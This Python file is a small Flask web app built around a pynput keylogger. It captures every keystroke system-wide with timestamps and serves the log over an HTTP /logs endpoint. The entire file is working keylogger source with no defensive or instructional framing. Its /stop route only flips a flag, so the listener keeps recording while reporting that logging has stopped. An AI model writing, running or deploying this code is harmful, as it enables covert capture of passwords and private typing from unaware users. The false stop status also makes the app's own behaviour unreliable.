from flask import Flask, render_template, jsonify
from pynput import keyboard
from datetime import datetime

app = Flask(__name__)

logged_keys = []
is_logging = False

def on_press(key):
    global logged_keys
    timestamp = datetime.now().strftime("%I:%M:%S %p")  # Format the current time
    try:
        if key.char == ' ':  # Handle space for readability
            logged_keys.append(f"{timestamp}: Key ' ' pressed.")
        else:
            logged_keys.append(f"{timestamp}: Key '{key.char}' pressed.")  # Capture character keys
    except AttributeError:
        if key == keyboard.Key.enter:
            logged_keys.append(f"{timestamp}: Key 'Enter' pressed.")  # Log Enter key
        elif key == keyboard.Key.backspace:
            logged_keys.append(f"{timestamp}: Key 'Backspace' pressed.")  # Log Backspace
        else:
            logged_keys.append(f"{timestamp}: Key '{str(key).split('.')[-1]}' pressed.")  # Log other special keys

def start_logging():
    global is_logging
    if not is_logging:
        is_logging = True
        listener = keyboard.Listener(on_press=on_press)
        listener.start()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start():
    start_logging()
    return jsonify({'status': 'Logging started'})

@app.route('/stop', methods=['POST'])
def stop():
    global is_logging
    is_logging = False
    return jsonify({'status': 'Logging stopped'})

@app.route('/logs', methods=['GET'])
def logs():
    global logged_keys
    return jsonify({'logs': '\n'.join(logged_keys)})  # Join the logged keys with new lines

if __name__ == '__main__':
    app.run(debug=True,use_reloader = False)